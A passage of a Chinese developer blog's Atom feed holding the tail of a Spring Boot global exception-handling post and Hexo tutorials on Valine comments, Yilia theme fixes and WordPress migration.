class="params">(HttpMessageNotReadableException e, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;handleConstraintViolationException start, uri:&#123;&#125;, caused by: &quot;</span>, request.getRequestURI(), e);</span><br><span class="line">        <span class="keyword">return</span> DefaultErrorResult.failure(ResultCode.COMM_PARAM_IS_INVALID, e, HttpStatus.BAD_REQUEST);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理参数绑定时异常（反400错误码）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.BAD_REQUEST)</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(BindException.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultErrorResult <span class="title">handleBindException</span><span class="params">(BindException e, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;handleBindException start, uri:&#123;&#125;, caused by: &quot;</span>, request.getRequestURI(), e);</span><br><span class="line">        List&lt;ParameterInvalidItem&gt; parameterInvalidItemList = ParameterInvalidItemHelper.convertBindingResultToMapParameterInvalidItemList(e.getBindingResult());</span><br><span class="line">        <span class="keyword">return</span> DefaultErrorResult.failure(ResultCode.COMM_PARAM_IS_INVALID, e, HttpStatus.BAD_REQUEST, parameterInvalidItemList);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 处理使用<span class="doctag">@Validated</span>注解时，参数验证错误异常（反400错误码）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.BAD_REQUEST)</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(MethodArgumentNotValidException.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultErrorResult <span class="title">handleMethodArgumentNotValidException</span><span class="params">(MethodArgumentNotValidException e, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;handleMethodArgumentNotValidException start, uri:&#123;&#125;, caused by: &quot;</span>, request.getRequestURI(), e);</span><br><span class="line">        List&lt;ParameterInvalidItem&gt; parameterInvalidItemList = ParameterInvalidItemHelper.convertBindingResultToMapParameterInvalidItemList(e.getBindingResult());</span><br><span class="line">        <span class="keyword">return</span> DefaultErrorResult.failure(ResultCode.COMM_PARAM_IS_INVALID, e, HttpStatus.BAD_REQUEST, parameterInvalidItemList);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 处理运行时异常 （反500错误码）*/</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(RuntimeException.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> DefaultErrorResult <span class="title">handleRuntimeException</span><span class="params">(RuntimeException e, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//TODO 可通过邮件、微信公众号等方式发送信息至开发人员、记录存档等操作</span></span><br><span class="line">        log.error(<span class="string">&quot;handleRuntimeException start, uri:&#123;&#125;, caused by: &quot;</span>, request.getRequestURI(), e);</span><br><span class="line">        <span class="keyword">return</span> DefaultErrorResult.failure(ResultCode.COMM_SYSTEM_INNER_ERROR, e, HttpStatus.INTERNAL_SERVER_ERROR);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* 处理自定义异常 */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        主要在这里进行一个自定义异常的处理</span></span><br><span class="line"><span class="comment">        首先通过Business.class说明该函数接管此类异常</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="meta">@ExceptionHandler(BusinessException.class)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ResponseEntity&lt;DefaultErrorResult&gt; <span class="title">handleBusinessException</span><span class="params">(BusinessException e, HttpServletRequest request)</span> </span>&#123;</span><br><span class="line">        log.error(<span class="string">&quot;handleBusinessException start, uri:&#123;&#125;, exception:&#123;&#125;, caused by: &#123;&#125;&quot;</span>, request.getRequestURI(), e.getClass(), e.getMessage());</span><br><span class="line">        <span class="comment">//通过定义的failure方法来初始化格式化的返回结果</span></span><br><span class="line">        DefaultErrorResult defaultErrorResult = DefaultErrorResult.failure(e);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         ResponseEntity.status().body();</span></span><br><span class="line"><span class="comment">         status处可填入任何状态码，填多少返回时的HTTP状态就是多少，body处填入返回的结果</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.status(defaultErrorResult.getStatus()).body(defaultErrorResult);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  本文目的：集成Spring Boot的异常处理类，进行自定义的全局异常处理，并自定义返回的HTTP状态码。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;目录&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%96%B0%E5%BB%BA%E5</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="Spring Boot" scheme="https://coder.lufer.cc/tags/Spring-Boot/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+GitHub搭建博客(六) 添加评论功能</title>
    <link href="https://coder.lufer.cc/Hexo/Hexo-GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E5%85%AD-%E6%B7%BB%E5%8A%A0%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD/"/>
    <id>https://coder.lufer.cc/Hexo/Hexo-GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E5%85%AD-%E6%B7%BB%E5%8A%A0%E8%AF%84%E8%AE%BA%E5%8A%9F%E8%83%BD/</id>
    <published>2018-05-18T08:14:56.000Z</published>
    <updated>2021-04-20T08:32:44.233Z</updated>
    
    <content type="html"><![CDATA[<p>  使用Valine作为评论插件。</p><h1 id="部署leancloud"><a class="markdownIt-Anchor" href="#部署leancloud"></a> 部署LeanCloud</h1><p>  点击下方链接注册。</p><p>  <code>https://leancloud.cn/dashboard/login.html#/signup</code></p><p>  注册后登陆，在控制台点击<code>创建新应用</code>，填写应用名称，点击创建。</p><p>  点击<code>云引擎</code>-&gt;<code>设置</code>。</p><p>  代码库部分填入：</p><p>  <code>https://github.com/panjunwen/Valine-Admin.git</code></p><p>  Deploy Key不用管，直接点保存。</p><p>  点击<code>云引擎</code>-&gt;<code>部署</code>。</p><p>  <code>部署目标</code>-&gt;<code>生产环境</code>，分支或版本号填写<code>master</code>，点击部署。</p><p>  <code>云引擎</code>-&gt;<code>设置</code>-&gt;<code>自定义环境变量</code>，填写如下环境变量：</p><table><thead><tr><th>变量名</th><th>变量值</th><th>变量说明</th></tr></thead><tbody><tr><td>SITE_NAME</td><td>Lufer</td><td>网站名</td></tr><tr><td>SITE_URL</td><td><a href="https://luferl.github.io">https://luferl.github.io</a></td><td>网站网址</td></tr><tr><td>SMTP_HOST</td><td><a href="http://smtp.163.com">smtp.163.com</a></td><td>smtp服务器，这里以163为例</td></tr><tr><td>SMTP_PORT</td><td>465</td><td>ssl链接端口</td></tr><tr><td>SMTP_USER</td><td><a href="mailto:Lufercc@163.com">Lufercc@163.com</a></td><td>要使用的邮箱</td></tr><tr><td>SMTP_PASS</td><td>blablabla</td><td>邮箱的smtp密码</td></tr><tr><td>SENDER_NAME</td><td>Lufer</td><td>发件人昵称</td></tr><tr><td>SENDER_EMAIL</td><td><a href="mailto:Lufercc@163.com">Lufercc@163.com</a></td><td>发件人邮箱号</td></tr></tbody></table><p>  点击保存即可。这里注意，网易邮箱的SMTP密码要在邮箱里单独设置。</p><p>  在下方设置Web主机域名，这样就可以通过设置的域名访问后台管理页。</p><p>  点击<code>存储</code>-&gt;<code>User</code>。</p><p>  点击Username和Password两列，编辑单元格，填入用户名密码，用于登录后台管理页。</p><p>  <code>设置</code>-&gt;<code>安全中心</code>-&gt;<code>Web安全域名</code>，填上你的域名，注意http,https区分填写。</p><p>  <code>设置</code>-&gt;<code>应用Key</code>，记下来APPID和App Key，在下一个步骤会用到。</p><p>  至此LeanCloud设置完成，点击<code>云引擎</code>-&gt;<code>实例</code>-&gt;<code>小齿轮</code>点击重启即可。</p><h2 id="修改yilia"><a class="markdownIt-Anchor" href="#修改yilia"></a> 修改Yilia</h2><p>  <code>\yilia\_config.yml</code>,添加以下内容:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#6、Valine https:&#x2F;&#x2F;valine.js.org</span><br><span class="line">valine: </span><br><span class="line"> appid:  #Leancloud应用的appId</span><br><span class="line"> appkey:  #Leancloud应用的appKey</span><br><span class="line"> verify: false #验证码</span><br><span class="line"> notify: false #评论回复提醒</span><br><span class="line"> avatar: &#39;&#39; #评论列表头像样式：&#39;&#39;&#x2F;mm&#x2F;identicon&#x2F;monsterid&#x2F;wavatar&#x2F;retro&#x2F;hide</span><br><span class="line"> avatar_cdn: &#39;https:&#x2F;&#x2F;sdn.geekzu.org&#x2F;avatar&#x2F;&#39; #头像CDN</span><br><span class="line"> placeholder: &#39;瞎白话&#39; #评论框占位符</span><br><span class="line"> pageSize: 15 #评论分页</span><br></pre></td></tr></table></figure><p>  <code>\yilia\layout\_partial\article.ejs</code>,添加对valine的支持</p><p>  在各种if之间插入以下代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% if (theme.valine &amp;&amp; theme.valine.appid &amp;&amp; theme.valine.appkey)&#123; %&gt;</span><br><span class="line">  &lt;section id&#x3D;&quot;comments&quot; class&#x3D;&quot;comments&quot;&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      .comments&#123;margin:30px;padding:10px;background:#fff&#125;</span><br><span class="line">      @media screen and (max-width:800px)&#123;.comments&#123;margin:auto;padding:10px;background:#fff&#125;&#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">    &lt;%- partial(&#39;post&#x2F;valine&#39;, &#123;</span><br><span class="line">      key: post.slug,</span><br><span class="line">      title: post.title,</span><br><span class="line">      url: config.url+url_for(post.path)</span><br><span class="line">      &#125;) %&gt;</span><br><span class="line">  &lt;&#x2F;section&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>  <code>在\yilia\layout\_partial\post\下创建valine.ejs</code>,填入以下内容:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;vcomment&quot;</span> <span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;comment&quot;</span>&gt;&lt;/div&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;//cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&quot;//cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=<span class="string">&#x27;//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js&#x27;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">   <span class="keyword">var</span> notify = <span class="string">&#x27;&lt;%= theme.valine.notify %&gt;&#x27;</span> == <span class="literal">true</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">var</span> verify = <span class="string">&#x27;&lt;%= theme.valine.verify %&gt;&#x27;</span> == <span class="literal">true</span> ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">   <span class="keyword">new</span> Valine(&#123;</span><br><span class="line">            av: AV,</span><br><span class="line">            el: <span class="string">&#x27;#vcomment&#x27;</span>,</span><br><span class="line">            notify: notify,</span><br><span class="line">            verify: verify,</span><br><span class="line">            app_id: <span class="string">&quot;&lt;%= theme.valine.appid %&gt;&quot;</span>,</span><br><span class="line">            app_key: <span class="string">&quot;&lt;%= theme.valine.appkey %&gt;&quot;</span>,</span><br><span class="line">            placeholder: <span class="string">&quot;&lt;%= theme.valine.placeholder %&gt;&quot;</span>,</span><br><span class="line">            avatar: <span class="string">&quot;&lt;%= theme.valine.avatar %&gt;&quot;</span>,</span><br><span class="line">            avatar_cdn: <span class="string">&quot;&lt;%= theme.valine.avatar_cdn %&gt;&quot;</span>,</span><br><span class="line">            pageSize: &lt;%= theme.valine.pageSize %&gt;</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  使用Valine作为评论插件。&lt;/p&gt;
&lt;h1 id=&quot;部署leancloud&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#部署leancloud&quot;&gt;&lt;/a&gt; 部署LeanCloud&lt;/h1&gt;
&lt;p&gt;  点击下方链接注册。&lt;/p&gt;
&lt;p&gt; </summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+GitHub搭建博客(五) Yilia主题优化</title>
    <link href="https://coder.lufer.cc/Hexo/Hexo-GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E4%BA%94-Yilia%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/"/>
    <id>https://coder.lufer.cc/Hexo/Hexo-GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E4%BA%94-Yilia%E4%B8%BB%E9%A2%98%E4%BC%98%E5%8C%96/</id>
    <published>2018-05-18T06:44:14.000Z</published>
    <updated>2021-04-20T08:32:44.232Z</updated>
    
    <content type="html"><![CDATA[<p>  Yilia主题还是挺漂亮的，但是还是有一些小BUG或者需要改进的地方。</p><h2 id="分类目录双斜线问题"><a class="markdownIt-Anchor" href="#分类目录双斜线问题"></a> 分类目录双斜线问题</h2><p>  当你点击一个分类目录时，URL会变成<code>YourSite/Categories/Category//</code>。</p><p>  结尾多了一个斜线。</p><p>  解决方案：</p><p>  修改<code>yilia\layout\_partial\post\category.ejs</code>第7行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&lt;%&#x3D; config.root %&gt;&lt;%&#x3D; tag.path %&gt;&#x2F;&quot; class&#x3D;&quot;article-tag-list-link color&lt;%&#x3D; tag.name.length % 5 + 1 %&gt;&quot;&gt;&lt;%-tag.name%&gt;&lt;&#x2F;a&gt;  </span><br></pre></td></tr></table></figure><p>  删掉<code>/</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&lt;%&#x3D; config.root %&gt;&lt;%&#x3D; tag.path %&gt;&quot; class&#x3D;&quot;article-tag-list-link color&lt;%&#x3D; tag.name.length % 5 + 1 %&gt;&quot;&gt;&lt;%-tag.name%&gt;&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><h2 id="头像保存位置问题"><a class="markdownIt-Anchor" href="#头像保存位置问题"></a> 头像保存位置问题</h2><p>  头像保存到<code>theme\yilia\sorce\img</code>下，假设为headimg.jpg。</p><p>  然后在主题的<code>_config.yml</code>下修改<code>avatar: img/headimg.jpg</code>。</p><p>  这里有一个BUG，就是在这里的头像仅能在首页显示，如果需要在所有页面均可显示，则需要进行修改。</p><p>  PC端修改<code>theme\yilia\layout\_partial\left-col.ejs</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&lt;%&#x3D;theme.root%&gt;&quot; class&#x3D;&quot;profilepic&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&lt;%&#x3D;theme.avatar%&gt;&quot; class&#x3D;&quot;js-avatar&quot;&gt;</span><br><span class="line">&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>  修改为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a href&#x3D;&quot;&lt;%&#x3D;theme.root%&gt;&quot; class&#x3D;&quot;profilepic&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&lt;%&#x3D;theme.root+theme.avatar%&gt;&quot; class&#x3D;&quot;js-avatar&quot;&gt;</span><br><span class="line">&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><p>  主要修改img那行的src位置。</p><p>  移动端头像需要修改<code>theme\yilia\layout\_partial\mobile-nav.ejs</code>，<code>9-11</code>行。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;profilepic&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&lt;%&#x3D;theme.avatar%&gt;&quot; class&#x3D;&quot;js-avatar&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>  修改为：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;profilepic&quot;&gt;</span><br><span class="line">&lt;img src&#x3D;&quot;&lt;%&#x3D;theme.root+theme.avatar%&gt;&quot; class&#x3D;&quot;js-avatar&quot;&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h2 id="目录页与标签页的建立"><a class="markdownIt-Anchor" href="#目录页与标签页的建立"></a> 目录页与标签页的建立</h2><p>  这个主题是不带目录页和标签页的，需要我们自己实现。</p><p>  首先修改<code>yilia\layout\page.ejs</code>,把对于<code>categories</code>与<code>tags</code>的判断加上，并分别指向<code>categories-page</code>与<code>tags-page</code>两个模板。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;% if (&#39;categories&#39; &#x3D;&#x3D; page.type) &#123; %&gt;</span><br><span class="line">    &lt;%- partial(&#39;_partial&#x2F;categories-page&#39;, &#123;post: page, index: false&#125;) %&gt;</span><br><span class="line">  &lt;% &#125; else if (&#39;tags&#39; &#x3D;&#x3D; page.type) &#123; %&gt;</span><br><span class="line">    &lt;%- partial(&#39;_partial&#x2F;tags-page&#39;, &#123;post: page, index: false&#125;) %&gt;</span><br><span class="line">  &lt;% &#125; else &#123; %&gt;</span><br><span class="line">    &lt;%- partial(&#39;_partial&#x2F;article&#39;, &#123;post: page, index: false&#125;) %&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br></pre></td></tr></table></figure><p>  随后我们建立<code>categories-page</code>模板页，在<code>_partial</code>下新建<code>categories-page.ejs</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;section class&#x3D;&quot;archives-wrap&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;archive-year-wrap&quot;&gt;</span><br><span class="line">    &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;archive-year&quot;&gt;全部分类&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;archives&quot;&gt;</span><br><span class="line">    &lt;article class&#x3D;&quot;archive-article archive-type-category&quot;&gt;</span><br><span class="line">      &lt;div class&#x3D;&quot;archive-article-inner&quot;&gt;</span><br><span class="line">        &lt;header class&#x3D;&quot;archive-article-header&quot;&gt;</span><br><span class="line">          &lt;div class&#x3D;&quot;article-info&quot;&gt;</span><br><span class="line">            &lt;div class&#x3D;&quot;article-category tagcloud&quot;&gt;</span><br><span class="line">              &lt;ul class&#x3D;&quot;article-tag-list&quot;&gt;</span><br><span class="line">                &lt;% site.categories.each(function(tag, i) &#123; %&gt; </span><br><span class="line">                  &lt;li class&#x3D;&quot;article-tag-list-item&quot;&gt;</span><br><span class="line">                    &lt;a href&#x3D;&quot;&lt;%&#x3D; config.root %&gt;&lt;%&#x3D; tag.path %&gt;&#x2F;&quot; class&#x3D;&quot;article-tag-list-link color&lt;%&#x3D; tag.name.length % 5 + 1 %&gt;&quot;&gt;&lt;%- tag.name %&gt;&lt;&#x2F;a&gt;</span><br><span class="line">                  &lt;&#x2F;li&gt;</span><br><span class="line">                &lt;% &#125;) %&gt;</span><br><span class="line">              &lt;&#x2F;ul&gt;</span><br><span class="line">            &lt;&#x2F;div&gt;</span><br><span class="line">          &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;&#x2F;header&gt;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;article&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line">&lt;% site.categories.each(function (category) &#123; %&gt;</span><br><span class="line">  &lt;section class&#x3D;&quot;archives-wrap&quot;&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;archive-year-wrap&quot;&gt;</span><br><span class="line">      &lt;a href&#x3D;&quot;&lt;%- url_for(category.path) %&gt;&quot; class&#x3D;&quot;archive-year&quot;&gt;&lt;%&#x3D; category.name %&gt;&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;archives&quot;&gt;</span><br><span class="line">      &lt;% var i &#x3D; 0 %&gt;</span><br><span class="line">      &lt;% site.posts.each(function (post) &#123; %&gt;</span><br><span class="line">        &lt;% var belong &#x3D; false; %&gt;</span><br><span class="line">        &lt;% post.categories.each(function (c) &#123; %&gt;</span><br><span class="line">          &lt;% if (c.name &#x3D;&#x3D; category.name) &#123; %&gt;</span><br><span class="line">            &lt;% belong &#x3D; true; %&gt;</span><br><span class="line">          &lt;% &#125; %&gt;</span><br><span class="line">        &lt;% &#125;) %&gt;</span><br><span class="line">        &lt;% if (belong) &#123; %&gt;</span><br><span class="line">          &lt;% i &#x3D; i+1 %&gt;</span><br><span class="line">          &lt;%- partial(&#39;_partial&#x2F;archive-post&#39;, &#123;post: post, even: i % 2 &#x3D;&#x3D; 0, index: true&#125;) %&gt;</span><br><span class="line">        &lt;% &#125; %&gt;</span><br><span class="line">      &lt;% &#125;) %&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;section&gt;</span><br><span class="line">&lt;% &#125;) %&gt;</span><br></pre></td></tr></table></figure><p>  同理建立<code>tags-page.ejs</code>。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;section class&#x3D;&quot;archives-wrap&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;archive-year-wrap&quot;&gt;</span><br><span class="line">  &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;archive-year&quot;&gt;全部标签&lt;&#x2F;a&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;archives&quot;&gt;</span><br><span class="line">  &lt;article class&#x3D;&quot;archive-article archive-type-category&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;archive-article-inner&quot;&gt;</span><br><span class="line">  &lt;header class&#x3D;&quot;archive-article-header&quot;&gt;</span><br><span class="line">&lt;div class&#x3D;&quot;article-info&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;article-category tagcloud&quot;&gt;</span><br><span class="line">&lt;ul class&#x3D;&quot;article-tag-list&quot;&gt;</span><br><span class="line">  &lt;% site.tags.each(function(tag, i) &#123; %&gt; </span><br><span class="line">&lt;li class&#x3D;&quot;article-tag-list-item&quot;&gt;</span><br><span class="line">  &lt;a href&#x3D;&quot;&lt;%&#x3D; config.root %&gt;&lt;%&#x3D; tag.path %&gt;&#x2F;&quot; class&#x3D;&quot;article-tag-list-link color&lt;%&#x3D; tag.name.length % 5 + 1 %&gt;&quot;&gt;&lt;%- tag.name %&gt;&lt;&#x2F;a&gt;</span><br><span class="line">&lt;&#x2F;li&gt;</span><br><span class="line">  &lt;% &#125;) %&gt;</span><br><span class="line">&lt;&#x2F;ul&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;header&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;article&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;section&gt;</span><br><span class="line">  &lt;% site.tags.each(function (tag) &#123; %&gt;</span><br><span class="line">&lt;section class&#x3D;&quot;archives-wrap&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;archive-year-wrap&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&lt;%- url_for(tag.path) %&gt;&quot; class&#x3D;&quot;archive-year&quot;&gt;&lt;%&#x3D; tag.name %&gt;&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;archives&quot;&gt;</span><br><span class="line">&lt;% var i &#x3D; 0 %&gt;</span><br><span class="line">&lt;% site.posts.each(function (post) &#123; %&gt;</span><br><span class="line">  &lt;% var belong &#x3D; false; %&gt;</span><br><span class="line">  &lt;% post.tags.each(function (c) &#123; %&gt;</span><br><span class="line">&lt;% if (c.name &#x3D;&#x3D; tag.name) &#123; %&gt;</span><br><span class="line">  &lt;% belong &#x3D; true; %&gt;</span><br><span class="line">&lt;% &#125; %&gt;</span><br><span class="line">  &lt;% &#125;) %&gt;</span><br><span class="line">  &lt;% if (belong) &#123; %&gt;</span><br><span class="line">&lt;% i &#x3D; i+1 %&gt;</span><br><span class="line">&lt;%- partial(&#39;_partial&#x2F;archive-post&#39;, &#123;post: post, even: i % 2 &#x3D;&#x3D; 0, index: true&#125;) %&gt;</span><br><span class="line">  &lt;% &#125; %&gt;</span><br><span class="line">&lt;% &#125;) %&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;section&gt;</span><br><span class="line">  &lt;% &#125;) %&gt;</span><br></pre></td></tr></table></figure><p>  新建<code>categories</code>和<code>tags</code>页面。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page categories  </span><br><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>  修改page head。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.md:</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2018-05-18 00:50:24</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>  同理修改tags不细说。</p><p>  修改<code>yilia\_config.yml</code>,Menu中加上两个页面。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">分类: &#x2F;categories</span><br><span class="line">标签: &#x2F;tags</span><br></pre></td></tr></table></figure><p>  至此完成两个页面的建立。</p><p>  不过对于标签页，有自建的smart-menu，支持标签云的检索。</p><p>  对于目录页，已经有很多Issue，作者表示将来会加上，只是还没想好做成什么样子而已。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  Yilia主题还是挺漂亮的，但是还是有一些小BUG或者需要改进的地方。&lt;/p&gt;
&lt;h2 id=&quot;分类目录双斜线问题&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#分类目录双斜线问题&quot;&gt;&lt;/a&gt; 分类目录双斜线问题&lt;/h2&gt;
&lt;p&gt;  当你点击</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+GitHub搭建博客(四) WordPress迁移</title>
    <link href="https://coder.lufer.cc/Hexo/Hexo-GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E5%9B%9B-WordPress%E8%BF%81%E7%A7%BB/"/>
    <id>https://coder.lufer.cc/Hexo/Hexo-GitHub%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2-%E5%9B%9B-WordPress%E8%BF%81%E7%A7%BB/</id>
    <published>2018-05-18T06:36:57.000Z</published>
    <updated>2021-04-20T08:32:44.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="wordpress导出"><a class="markdownIt-Anchor" href="#wordpress导出"></a> WordPress导出</h2><p>  <code>WordPress 仪表盘-&gt;工具-&gt;导出-&gt;所有内容</code></p><p>  会导出一个xml文件，假设保存在D:\1.xml。</p><h2 id="hexo导入"><a class="markdownIt-Anchor" href="#hexo导入"></a> Hexo导入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-migrator-wordpress --save  </span><br><span class="line">hexo migrate wordpress D:\1.xml</span><br></pre></td></tr></table></figure><p>  大功告成。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;wordpress导出&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#wordpress导出&quot;&gt;&lt;/a&gt; WordPress导出&lt;/h2&gt;
&lt;p&gt;  &lt;code&gt;WordPress 仪表盘-&amp;gt;工具-&amp;gt;导出-&amp;gt;所有内容&lt;</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
